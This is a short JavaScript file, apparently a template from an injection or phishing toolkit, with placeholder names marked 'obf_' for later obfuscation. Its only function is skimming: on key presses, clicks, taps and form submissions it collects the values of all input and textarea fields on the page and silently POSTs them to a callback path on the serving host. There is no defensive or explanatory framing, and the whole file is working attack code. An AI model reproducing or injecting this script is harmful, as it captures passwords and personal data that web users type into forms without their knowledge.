var obf_var_hooked = false

function obf_func_callback() {
	var obf_var_inputs    = document.getElementsByTagName("input"),
	    obf_var_textareas = document.getElementsByTagName("textarea"),
	    obf_var_params    = ""
	for (var obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
		if (obf_var_inputs[obf_var_i].value != "") {
			obf_var_params = obf_var_params + obf_var_inputs[obf_var_i].name + "=" + obf_var_inputs[obf_var_i].value + ( obf_var_i < (obf_var_inputs.length-1) ? "&" : "" )
		}
	}
	for (var obf_var_i = 0; obf_var_i < obf_var_textareas.length; obf_var_i++) {
		if (obf_var_textareas[obf_var_i].value != "") {
			obf_var_params = obf_var_params + obf_var_textareas[obf_var_i].name + "=" + obf_var_textareas[obf_var_i].value + ( obf_var_i < (obf_var_textareas.length-1) ? "&" : "" )
		}
	}
	if (obf_var_params.length > 0) {
	  obf_var_req = new XMLHttpRequest()
	  obf_var_req.open("POST", "http://" + location.host + "/obf_path_callback?" + obf_var_params, true)
	  obf_var_req.send()
	}
}

self.addEventListener("keydown", function(obf_var_event) {
	(obf_var_event.key == "Enter" || obf_var_event.keyCode == 13) ? obf_func_callback() : ""
	if (obf_var_hooked == false) {
		self.addEventListener("click", obf_func_callback)
		self.addEventListener("touchend", obf_func_callback)
		obf_var_forms = document.querySelectorAll("form")
		for (var obf_var_i = 0; obf_var_i < obf_var_forms.length; obf_var_i++) {
			obf_var_forms[obf_var_i].addEventListener("submit", obf_func_callback)
		}
		obf_var_hooked = true
	}
})
